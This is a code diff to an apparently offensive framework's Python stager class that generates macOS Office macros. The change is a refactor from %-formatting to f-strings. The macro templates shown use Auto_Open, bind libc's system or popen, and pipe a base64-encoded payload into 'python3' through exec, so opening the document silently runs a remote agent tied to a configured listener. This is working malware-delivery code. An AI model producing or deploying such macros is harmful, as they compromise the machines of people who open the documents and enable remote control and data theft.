@@ -93,8 +93,7 @@ class Stager:
                 )
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + '"'
-            str1 = str1 + "\r\n" + str2
-            return str1
+            return str1 + "\r\n" + str2
 
         # extract all of our options
         listener_name = self.options["Listener"]["Value"]
@@ -126,7 +125,7 @@ class Stager:
             payload = formStr("cmd", match)
 
             if version == "old":
-                macro = """
+                macro = f"""
         #If VBA7 Then
             Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
         #Else
@@ -148,15 +147,13 @@ class Stager:
                     #If Mac Then
                             Dim result As Long
                             Dim cmd As String
-                            %s
+                            {payload}
                             'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                             result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                     #End If
-        End Function""" % (
-                    payload
-                )
+        End Function"""
             elif version == "new":
-                macro = """
+                macro = f"""
         Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
 
         Sub Auto_Open()
@@ -174,13 +171,11 @@ class Stager:
                     #If Mac Then
                             Dim result As LongPtr
                             Dim cmd As String
-                            %s
+                            {payload}
                             'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &")
                             result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python3 &", "r")
                     #End If
-        End Function""" % (
-                    payload
-                )
+        End Function"""
             else:
                 raise ValueError('Invalid version provided. Accepts "new" and "old"')
 
